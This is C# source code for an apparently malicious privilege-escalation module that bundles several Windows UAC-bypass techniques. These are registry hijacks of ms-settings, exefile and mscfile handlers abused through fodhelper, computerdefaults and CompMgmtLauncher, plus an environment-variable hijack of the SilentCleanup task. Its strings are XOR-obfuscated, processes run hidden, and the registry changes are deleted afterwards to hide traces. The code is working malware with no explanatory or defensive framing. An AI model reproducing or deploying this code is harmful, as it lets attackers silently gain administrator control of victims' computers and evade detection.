using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.Win32;

namespace Peg.ICARUS
{
    internal class AlphaAndOmega
    {
        public static string BCutEncrypt(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    public class Sucks
    {
        public Sucks(byte[] encodedCommand)
        {
            var command = Encoding.UTF8.GetString(encodedCommand);

            var newkey = Registry.CurrentUser.OpenSubKey(@"" + AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyV"), true);
            newkey.CreateSubKey(@"" + AlphaAndOmega.BCutEncrypt("orolcfoVYboffVEzodVieggkdn"));

            var sluikey =
                Registry.CurrentUser.OpenSubKey(
                    @"" + AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVorolcfoVYboffVEzodVieggkdn"), true);
            sluikey.SetValue("", command);
            sluikey.Close();

            //start fodhelper
            var p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = AlphaAndOmega.BCutEncrypt("I0VV}cdne}yVVysy~og98VVyfc$oro");
            p.StartInfo.Verb = AlphaAndOmega.BCutEncrypt("xdky");
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree(AlphaAndOmega.BCutEncrypt("orolcfo"));
        }

        public static void tosuck()
        {
            var windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Value(AlphaAndOmega.BCutEncrypt("Ifkyyoy"));
                Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmy"));
                Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboff"));
                Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezod"));
                var registryKey = Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn"));
                registryKey.SetValue("", Application.ExecutablePath, RegistryValueKind.String);
                registryKey.SetValue(AlphaAndOmega.BCutEncrypt("Nofomk~oOroi~o"), 0, RegistryValueKind.DWord);
                registryKey.Close();
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = Strings.StrReverse("exe.dmc"),
                        Arguments = AlphaAndOmega.BCutEncrypt("%i*y~kx~*iegz~oxnolkf~y$oro")
                    });
                }
#pragma warning disable CS0168 // The variable 'ex' is declared but never used
                catch (Exception ex)
#pragma warning restore CS0168 // The variable 'ex' is declared but never used
                {
                }

                Process.GetCurrentProcess().Kill();
            }
            else
            {
                var registryKey2 = Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn"));
                registryKey2.SetValue("", "", RegistryValueKind.String);
            }


            Thread.Sleep(10000);

            var ccpath = Assembly.GetExecutingAssembly().Location;
            Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).DeleteSubKeyTree(ccpath);
        }

        public static void suck(string filename)
        {
            var windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Value(AlphaAndOmega.BCutEncrypt("Ifkyyoy"));
                Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmy"));
                Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboff"));
                Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezod"));
                var registryKey = Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn"));
                registryKey.SetValue("", filename, RegistryValueKind.String);
                registryKey.SetValue(AlphaAndOmega.BCutEncrypt("Nofomk~oOroi~o"), 0, RegistryValueKind.DWord);
                registryKey.Close();
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = Strings.StrReverse("exe.dmc"),
                        Arguments = AlphaAndOmega.BCutEncrypt("%i*y~kx~*iegz~oxnolkf~y$oro")
                    });
                }
#pragma warning disable CS0168 // The variable 'ex' is declared but never used
                catch (Exception ex)
#pragma warning restore CS0168 // The variable 'ex' is declared but never used
                {
                }

                Process.GetCurrentProcess().Kill();
            }
            else
            {
                var registryKey2 = Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn"));
                registryKey2.SetValue("", "", RegistryValueKind.String);
            }


            Thread.Sleep(10000);

            var ccpath = Assembly.GetExecutingAssembly().Location;
            Value(AlphaAndOmega.BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).DeleteSubKeyTree(ccpath);
        }


        public static RegistryKey Value(string string_0)
        {
            var registryKey = Registry.CurrentUser.OpenSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVV") + string_0, true);
            if (!checksubkey(registryKey))
                registryKey = Registry.CurrentUser.CreateSubKey(AlphaAndOmega.BCutEncrypt("Yel~}kxoVV") + string_0);
            return registryKey;
        }


        public static bool checksubkey(RegistryKey registryKey_0)
        {
            return registryKey_0 != null;
        }
    }

    public class apha
    {
        public apha()
        {
            if (AlphaAndOmega.IsAdmin()) return;

            try
            {
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = AlphaAndOmega.BCutEncrypt("ign"),
                        Arguments = AlphaAndOmega.BCutEncrypt("%a*Y^KX^*V(V(*V(") +
                                    Process.GetCurrentProcess().MainModule.FileName +
                                    AlphaAndOmega.BCutEncrypt("V(*,*ORC^"),
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = AlphaAndOmega.BCutEncrypt("xdky"),
                        UseShellExecute = true
                    }
                };
                proc.Start();
                //Methods.ClientExit();
                Environment.Exit(0);
            }
            catch
            {
            }
        }
    }

    public class bita
    {
        public bita()
        {
            if (AlphaAndOmega.IsAdmin()) return;

            try
            {
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(AlphaAndOmega.BCutEncrypt("Od|cxedgod~"));
                key.SetValue(AlphaAndOmega.BCutEncrypt("}cdncx"),
                    @"" + AlphaAndOmega.BCutEncrypt("ign$oro*") + @"" + AlphaAndOmega.BCutEncrypt("%a*Y^KX^*") +
                    Process.GetCurrentProcess().MainModule.FileName + AlphaAndOmega.BCutEncrypt("*,*ORC^"));
                key.Close();

                var process = new Process();
                process.StartInfo.FileName = AlphaAndOmega.BCutEncrypt("yib~kyay$oro");
                process.StartInfo.Arguments =
                    AlphaAndOmega.BCutEncrypt("%xd*%~d*VVGcixeyel~VV]cdne}yVVNcyaIfokdzVVYcfod~Ifokdz*%C");
                process.Start();

                ///Methods.ClientExit();
                Environment.Exit(0);
            }
            catch
            {
            }
        }
    }


    public class gama
    {
        public gama()
        {
            if (AlphaAndOmega.IsAdmin()) return;

            try
            {
                RegistryKey key;
                RegistryKey command;
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"" +
                                           AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVgyilcfoVyboffVezodVieggkdn"));
                command = key.OpenSubKey(@"" + AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVgyilcfoVyboffVezodVieggkdn"),
                    true);
                command.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                key.Close();


                var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                var filePath = system + @"" + AlphaAndOmega.BCutEncrypt("VYsy~og98VIegzGmg~Fkdibox$oro");
                WinExec(@"" + AlphaAndOmega.BCutEncrypt("ign$oro*%a*Y^KX^*") + filePath, 0);
                Thread.Sleep(0);

                //Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("mscfile");
                Thread.Sleep(1000);
                //Methods.ClientExit();
                Environment.Exit(0);
            }
#pragma warning disable CS0168 // The variable 'ex' is declared but never used
            catch (Exception ex)
#pragma warning restore CS0168 // The variable 'ex' is declared but never used
            {
                //Packet.Error(ex.Message);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);
    }

    public class delta
    {
        public delta()
        {
            if (AlphaAndOmega.IsAdmin()) return;

            try
            {
                RegistryKey key;
                RegistryKey command;
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"" +
                                           AlphaAndOmega.BCutEncrypt(
                                               "Yel~}kxoVIfkyyoyVgy'yo~~cdmyVyboffVezodVieggkdn"));
                command = key.OpenSubKey(
                    @"" + AlphaAndOmega.BCutEncrypt("Yel~}kxoVIfkyyoyVgy'yo~~cdmyVyboffVezodVieggkdn"), true);
                command.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                command.SetValue(AlphaAndOmega.BCutEncrypt("Nofomk~oOroi~o"), "");
                key.Close();


                var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                var filePath = system + @"" + AlphaAndOmega.BCutEncrypt("VYsy~og98Vlenbofzox$oro");
                WinExec(@"" + AlphaAndOmega.BCutEncrypt("ign$oro*%a*Y^KX^*") + filePath, 0);
                Thread.Sleep(0);

                //Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("ms-settings");

                //Methods.ClientExit();
                Environment.Exit(0);
            }
#pragma warning disable CS0168 // The variable 'ex' is declared but never used
            catch (Exception ex)
#pragma warning restore CS0168 // The variable 'ex' is declared but never used
            {
                //Packet.Error(ex.Message);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);
    }
}